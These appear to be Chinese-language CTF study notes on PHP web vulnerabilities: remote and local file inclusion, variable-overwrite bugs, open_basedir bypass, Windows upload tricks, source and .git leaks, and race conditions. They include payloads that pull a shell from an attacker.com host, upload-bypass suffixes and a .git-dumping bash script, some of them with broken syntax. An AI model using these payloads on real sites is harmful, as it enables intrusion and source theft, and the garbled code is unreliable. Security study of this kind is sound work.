



### php伪协议
* 条件
> allow_url_include = 1

* 参数
``` 

?file=http://attacker.com/shell.jpg
?file=zip://attacker.com/shell.php
# 本地文件包含
php://filter/convert.base64-encode/resource=index.php
```
----
### 变量漏洞

#### 函数使用不当
1. extract函数
```
<？php
$auth = false;
extract($_GET);
if($auth){
	echo "flag{..}"
}else {
	echo "access Denied";
}
?>
```
* 构建payload
> ?auth=1

2. parse_str函数
```
<?php 
$auth = false;
parse_str($_SERVER['QUERY_STRING']);
if($auth){
	echo "flag{...}";
}else{
	echo "access Denied";
}
?>
```
* 构建payload
> ?auth=1

3. import_request_variables函数
```
<?php 
$auth = false;
import_request_variables('G');
if($auth){
	echo "flag{...}";
}else{
	echo "access Denied";
}
?>
```
> G代表GET、P代表POST、C代表Cookies.排在前面的字符会覆盖后面的字符，如：GP，POST请求会忽略。

#### 配置不当
* 环境
> PHP < 5.4  
* 影响参数
> register_globals=ON

* 效果
```
<?php 
if($auth) {
	echo "flag{...}";
} else {
	echo "access Denied";
}
?>
```
> 用户传入参数auth=1即可进入if语句块。如果在if语句块前初始化￥auth变量，则不会出发这个漏洞


#### 代码逻辑漏洞

* 环境
> PHP 
* 影响参数
> $$  
> 可变变量可以浪一个普通的变量的值作为这个可变变量的变量名

* 效果
```
<?php 
$auth = false;
foreach($_GET as $key => $value){
	$$key = $value;
}
if($auth) {
	echo "flag{...}";
} else {
	echo "access Denied";
}
?>
```
* payload
> ?auth=1

----
### 防护绕过

#### open_basedir
* 环境
> PHP 
* 影响参数
> open_basedir  : 防御PHP跨目录进行文件读写方法
> disable_function  : 
* 利用方法
> DirectoryIteratior + Glob
* 效果
```
<?php 
printf('<b>opeen_basedir:%s</b><br/>', ini_get('open_basedir'));
$file_list = array();
$it = new DirecoryIterator("glob:///*");
foreach($it as $f){
	$file_list[] = $f->__toString();
}

$it = new DirecoryIterator("glob:///.*");
foreach($it as $f){
	$file_list[] = $f->__toString();
}
?>

sort($file_list);
foreach($file_list as $f){
	echo "{$f}<br/>"
}
```
#### disable_function  
* 环境
> PHP 
* 影响参数
> disable_function : 禁用危险函数（system、exec、shell_exec）
* 利用方法
> 1. shellshook、imagemagick
> 2. LD_PRELOAD

----
### Windows系统特性
#### 短文件名
* 描述
> Windows以8.3格式生成与MS-Dos兼容的段文件名，以允许MS-Dos或16位Windows的程序访问这些文件
> cmd下dir/x可看到短文件名的效果

* 利用方法
> https://github.com/likoekoe//IIS_shortname_Scanner

> Windows下的Apache环境里，除了能爆破服务器文件，还能通过短文件下载长文件
#### 文件上传
* 描述
> 上传的时候如果以黑名单的形式限制后缀，可以利用文件系统的特性去绕过
* 利用方法
> 上传的时候在php后面追歼高位字符[\x80-\xff]，或者"::$data" 利用":$DATA Alternate Data Stream", 参考OWASP

> 特殊的符号冒号，如果我们上传的时候后缀改为".php:.png"形式，系统最后得到的是0字符的php后缀文件，起到了截断效果，但是没能写入内容


-----

## 代码审计

### 源码泄露

#### 常见备份文件
* 文本备份文件
```
.index.php.swp
.index.php.swo
index.php~
index.php.bak
index.php.txt
index.php.old
```
* 整站源码备份文件
```
www
wwwdata
wwwroot
web
backup
dist

# 后面加上压缩文件后缀名
.zip
.tar
.tar.gz
.7z
.rar

# 泄露目标结构或文件名的敏感文件来获取文件的位置
.DS_Store
```

#### Git泄露
* 题目提示
> 进入题目提供的登陆界面后可以看到一个非常显眼的提示字符串，可以github直接搜索

* 通过.git泄露
```
# 关键文件
.HEAD 	标记当前git在那个分支中
.refs    	标记改项目里的每一个分支指向的commit
.objects  	git本地仓库存储的所有对象
.commit 	标记一个项目的一次提交记录
.tree 	标记一个项目的目录或者子目录
.blob	标记一个项目的文件
.tag	命名一次提交
```
```
# git目录恢复文件原理
# https://github.com/denny0223/scrabble
# 查看HEAD文件获取分支的hash值
domain=$1
reef=$(curl -s $domain/.git/HEAD | awk '{print $2}')
tmp_dir=`echo $domain | awk -F '[/:]' '{print $4}'`
mkdir $tmp_dir
cd $tmp_dir
lastHash=$(curl -s $domain/.git/$ref)

# 得到hash值后说先本地初始化一个git，接着通过parseCommit获取全部对象，最后reset重设分支
git init
cd .git/objects/
parseCommit $lastHash
cd ../../
echo $lastHash > .git/refs/heads/master
git reset --head
```
* git函数补充
```
# parseCommot
# 函数用于下载commit对象，同时其parent也一并下载下来
function parseCommit{
	echo parseCommit $1
	downloadBlob $1
	tree=$(git cat-file -p $1|sed -n '1p' | awk '{print $2}')
	parseTree $tree
	parent=$(git cat-file -p $1|sed -n '2p' | awk '{print $2}')
	[$(#parent) -eq 40] && parseCommit $ parent
}

# parseTree
# 函数用于下载tree对象
function parseTree{
	echo parseTree $1
	downloadBlob $1
	while read line
	do
	type=$(echo $line |awk '{print $2}')
	hash=$(echo $line |awk '{print $3}')
	["$type" = "tree"] && parseTree $hash || downloadBlob $hash
	done << (git cat-file -p $1)
}

# downloadBlob
# 函数用于将hash对应的文件下载下来
function downloadBlob{
	echo downloadBlob $1
	mkdir -p ${1:0:2}
	cd $_
	wget -q -nc $domain/.git/objects/$(1:0:2)/${1:2}
	cd ..
}
```
#### svn泄露
#### 利用漏洞泄露
```
http://example.com/download.php?file=abc.pdf
http://example.com/show_image.php?file=10.jpg
```


### 代码审计的方法与技巧

* 小型代码
```
1.  找到各个输入点
2. 找到针对输入的过滤并尝试绕过
3. 找到处理输入的函数并提交查看有无漏洞
4. 找到漏洞后金总最充分的利用
```
* 大型代码
```
1.  找到危险函数
2.  向上回溯寻找有无可用的输入点
3.  尝试绕过针对输入点的过滤
4.  寻找出发漏洞的方法
```
* 审计工具
> RIPS   
> Sway

-----

## 条件竞争
* 描述
> 条件竞争漏洞是一种服务器端的漏洞，是由于开发者设计应用程序并发处理时操作逻辑不合理而造成。当应用面临高并发的请求时未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等